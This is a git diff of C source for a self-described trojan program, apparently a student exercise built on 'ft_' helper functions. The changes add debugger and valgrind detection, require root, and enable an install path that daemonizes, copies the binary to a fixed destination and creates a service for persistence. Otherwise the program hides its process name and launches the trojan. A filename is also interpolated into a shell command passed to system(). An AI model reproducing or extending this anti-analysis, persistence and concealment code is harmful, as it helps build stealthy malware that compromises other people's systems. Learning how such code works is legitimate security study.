@@ -6,7 +6,7 @@ char dir_name[PATH_MAX] = {0};
 bool	find_dir(char *dirname)
 {
 	char	*exec_paths = getenv("PATH");
-	char	*location = strnstr(exec_paths, dirname, -1);
+	char	*location = ft_strnstr(exec_paths, dirname, -1);
 
 	if (location != NULL) {
 		ft_dprintf(2, "found [%s]\n", location);
@@ -42,6 +42,7 @@ void	compact_binary(void)
 	sprintf(compact_cmd, "cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s", filename, filename, filename, filename, filename);
 	ft_dprintf(2, "cmd: %s\n", compact_cmd);
 	free(filename);
+
 	system(compact_cmd);
 
 	char	*argv[] = {
@@ -60,7 +61,7 @@ void	install_server(int argc, char **argv)
 		compact_binary();
 	ft_dprintf(2, "running as compacted binary\n");
 	ft_dprintf(2, "---------------------------\n");
-	printf("%s\n", "psegura-");
+	printf("%s\n", "psegura- & sacorder");
 	daemon(1, 1);
 	copy_file(path, DEST_PATH);
 	create_service();
@@ -77,22 +78,21 @@ void	exec_troyan(void)
 
 int main(int argc, char **argv)
 {
-	if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
-		ft_dprintf(2, "Debugger detected\n");
-		exit(1);
-	}
-	(void) argc;
-	/* if (geteuid() != 0) {
+	if (is_debugger_attached())
+		return (1);
+	if (is_valgrind_running())
+		return (1);
+	if (geteuid() != 0) {
 		ft_dprintf(2, "Error: not running as root\n");
 		return (1);
 	}
+
 	if (need_to_install_server()) {
 		install_server(argc, argv);
-	} else { */
-		hide_process_name(argv); //TODO maybe change more things, like bin path and service name during install???
+	} else {
+		hide_process_name(argv);
 		exec_troyan();
-	//}
-	return (0);
+	}
 }
 
 
